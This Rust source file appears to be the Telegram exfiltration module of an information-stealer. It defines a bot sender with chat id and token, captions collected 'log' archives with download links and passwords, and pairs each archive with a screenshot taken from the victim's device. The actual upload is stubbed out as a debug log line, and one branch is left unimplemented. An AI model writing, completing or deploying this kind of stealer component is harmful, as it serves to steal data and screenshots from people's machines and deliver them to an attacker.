use crate::{LogFile, LogSender, SendError};
use alloc::string::String;
use alloc::sync::Arc;
use alloc::vec::Vec;
use alloc::{format, vec};
use collector::{Collector, Device};
use derive_new::new;
use indoc::formatdoc;
use utils::{format_size, log_debug};

#[derive(new)]
pub struct TelegramBot {
    chat_id: i64,
    token: Arc<str>
}

fn generate_caption<P, C>(log: &LogFile, password: Option<P>, collector: &C) -> String
where
    P: AsRef<str>,
    C: Collector
{
    let mut caption = formatdoc! {
        r#"
            hey!!
        "#,
    };

    let link = match log {
        LogFile::ExternalLink((link, size)) => Some(
            format!(
                r#"<a href=\"{}\">Download [{}]</a>\"#,
                link,
                format_size(*size as _)
            )
        ),
        LogFile::ZipArchive(_) => None
    };

    let password = password.map(|password| {
        let password = password.as_ref();
        format!(r#"Password: <pre><span class=\"tg-spoiler\">{password}</span></pre>"#)
    });

    let mut parts = vec![];
    if let Some(l) = link { parts.push(l); }
    if let Some(p) = password { parts.push(p); }
    let thumbnail = if parts.is_empty() { None } else { Some(parts.join(" ")) };

    if let Some(thumbnail) = thumbnail {
        caption = formatdoc! {r#"
            {caption}

            {thumbnail}
        "#}
    }

    formatdoc! {r#"
        "caption": "{caption}",
        "parse_mode": "HTML"
    "#}
}

impl TelegramBot {
    fn send_as_file(&self, archive: Vec<u8>, screenshot: Option<Vec<u8>>, caption: String) -> Result<(), SendError>
    {
        log_debug!("{}", caption);
        Ok(())
    }
}

impl LogSender for TelegramBot {
    fn send<P, C>(&self, zip_archive: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
    where
        P: AsRef<str>,
        C: Collector
    {
        let caption = generate_caption(&zip_archive, password, collector);

        match zip_archive {
            LogFile::ZipArchive(archive) => self.send_as_file(archive, collector.get_device().get_screenshot(), caption),
            _ => unimplemented!()
        }
    }
}